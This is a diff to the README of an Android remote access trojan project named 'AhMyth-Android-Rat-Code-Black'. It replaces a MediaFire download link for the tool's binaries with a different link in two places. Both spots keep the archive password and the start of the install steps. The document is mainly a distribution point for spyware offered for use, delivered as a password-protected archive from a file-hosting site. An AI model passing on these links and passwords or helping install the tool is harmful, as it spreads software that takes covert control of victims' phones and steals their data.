@@ -1,6 +1,6 @@
 # AhMyth-Android-Rat-Code-Black
 
-[Click Here to Download](https://www.mediafire.com/file/5x2bsxzuqzot89z/AhMyth_Code_Black.zip/file)
+[Click Here to Download](https://www.mediafire.com/file/vffwp78lkc7ke24/AhMyth.zip/file)
 [Pass: S0f4fr33!]
 
 It consists of two parts :
@@ -15,7 +15,7 @@ To install:
 
 1) From binaries
 Prerequisite :
-Download a binary from [Click Here To Download](https://www.mediafire.com/file/5x2bsxzuqzot89z/AhMyth_Code_Black.zip/file)
+Download a binary from [Click Here To Download](https://www.mediafire.com/file/vffwp78lkc7ke24/AhMyth.zip/file)
 [Pass: S0f4fr33!]
 
 
